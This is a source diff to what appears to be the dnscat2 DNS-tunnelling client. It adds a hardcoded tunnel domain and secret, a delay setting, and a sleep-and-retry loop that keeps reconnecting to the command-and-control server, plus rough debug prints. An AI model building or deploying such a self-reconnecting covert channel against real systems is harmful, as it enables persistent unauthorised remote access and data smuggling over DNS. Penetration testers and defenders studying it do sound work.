@@ -40,10 +40,20 @@
 #define DEFAULT_DNS_HOST NULL
 #define DEFAULT_DNS_PORT 53
 
+/* Compile static parameters
+#define DNS_DOMAIN "example.org"
+#define DNS_SECRET "xxxxx"
+#define DNS_DELAY 1000
+#define DNS_RETRY 10
+#define DNS_RETRY_DELAY 5
+*/
+
 /* Define these outside the function so they can be freed by the atexec() */
 select_group_t *group         = NULL;
 driver_dns_t   *tunnel_driver = NULL;
 char           *system_dns    = NULL;
+
+int toexit=0;
 
 typedef struct
 {
@@ -152,6 +162,16 @@ typedef struct
   };
 } make_tunnel_driver_t;
 
+static void cleanuploop(void)
+{
+  LOG_WARNING("TerminatingLoop");
+
+  if(tunnel_driver)
+    driver_dns_destroy(tunnel_driver);
+
+  print_memory();
+}
+
 static void cleanup(void)
 {
   LOG_WARNING("Terminating");
@@ -160,6 +180,21 @@ static void cleanup(void)
 
   if(tunnel_driver)
     driver_dns_destroy(tunnel_driver);
+
+  if(group)
+    select_group_destroy(group);
+
+  if(system_dns)
+    safe_free(system_dns);
+
+  print_memory();
+}
+
+static void cleanupexit(void)
+{
+  LOG_WARNING("TerminatingExit");
+
+  controller_destroy();
 
   if(group)
     select_group_destroy(group);
@@ -410,6 +445,12 @@ int main(int argc, char *argv[])
 
   log_level_t       min_log_level = LOG_LEVEL_WARNING;
 
+  int count=0;
+  int maxcount=3;
+  int started=1;
+  int sleepfor=3600;
+
+
   group = select_group_create();
   system_dns = dns_get_system();
 
@@ -421,15 +462,19 @@ int main(int argc, char *argv[])
 
 #ifndef WIN32  
   /* set the SIGCHLD handler to SIG_IGN causing zombie child processes to be reaped automatically */
-  if(signal(SIGCHLD, SIG_IGN) == SIG_ERR) 
+  if(signal(SIGCHLD, SIG_IGN) == SIG_ERR)
   {
     perror("Couldn't set SIGCHLD handler to SIG_IGN");
     exit(1);
-  }  
+  }
 #endif
 
   /* Set the default log level */
   log_set_min_console_level(min_log_level);
+
+  #ifdef DNS_DELAY
+    session_set_delay(DNS_DELAY);
+  #endif
 
   /* Parse the command line options. */
   opterr = 0;
@@ -557,16 +602,61 @@ int main(int argc, char *argv[])
     }
   }
 
+
+
+#ifdef DNS_RETRY
+  maxcount=DNS_RETRY;
+#endif
+
+#ifdef DNS_RETRY_DELAY
+  sleepfor=DNS_RETRY_DELAY;
+#endif
+
+  /* Be sure we clean up at exit. */
+  /* atexit(cleanup); */
+
+  while ( maxcount<0 || count++<maxcount ) {
+   printf("Retry %d/%d\n",count,maxcount);
+   if (started==0) {
+	   printf("Sleeping for %d\n", sleepfor);
+#ifdef WIN32
+	   Sleep(sleepfor*1000);
+#else
+	   sleep(sleepfor);
+#endif
+   } else {
+	started=0;
+   }
+
+
+#ifdef DEFAULT_DNS_FOREVER
+  controller_set_max_retransmits(-1);
+#endif
+
+#ifdef DNS_SECRET
+  session_set_preshared_secret(DNS_SECRET);
+#endif
+
+
+  printf("2.First try %d\n",count);
+
   if(getenv("DNSCAT_DOMAIN")!=NULL) {
     if(getenv("DNSCAT_SECRET")!=NULL) {
       session_set_preshared_secret(getenv("DNSCAT_SECRET"));
     }
     tunnel_driver = create_dns_driver_internal(group, getenv("DNSCAT_DOMAIN"), "0.0.0.0", 53, DEFAULT_TYPES, NULL);
     tunnel_driver_created = TRUE;
+  } else {
+  #ifdef DNS_DOMAIN
+    tunnel_driver = create_dns_driver_internal(group, DNS_DOMAIN, "0.0.0.0", 53, DEFAULT_TYPES, NULL);
+    tunnel_driver_created = TRUE;
+  #endif
   }
+  printf("2.5First try %d\n",count);
 
   create_drivers(drivers_to_create);
-  ll_destroy(drivers_to_create);
+
+  printf("3.First try %d\n",count);
 
   if(tunnel_driver_created && argv[optind])
   {
@@ -594,12 +684,22 @@ int main(int argc, char *argv[])
       tunnel_driver = create_dns_driver_internal(group, argv[optind], "0.0.0.0", 53, DEFAULT_TYPES, NULL);
     }
   }
+  printf("4.First try %d\n",count);
 
-  /* Be sure we clean up at exit. */
-  atexit(cleanup);
 
   /* Start the driver! */
+  printf("=%d\n",tunnel_driver->is_closed);
   driver_dns_go(tunnel_driver);
+  printf("Cleanuploop\n");
+  cleanuploop();
+  if (toexit==1) {
+	printf("Server asked to shutdown. Exiting\n");
+	break;
+  }
+  }
+ printf("Cleanupexit\n");
+ ll_destroy(drivers_to_create);
+ cleanupexit();
 
   return 0;
 }
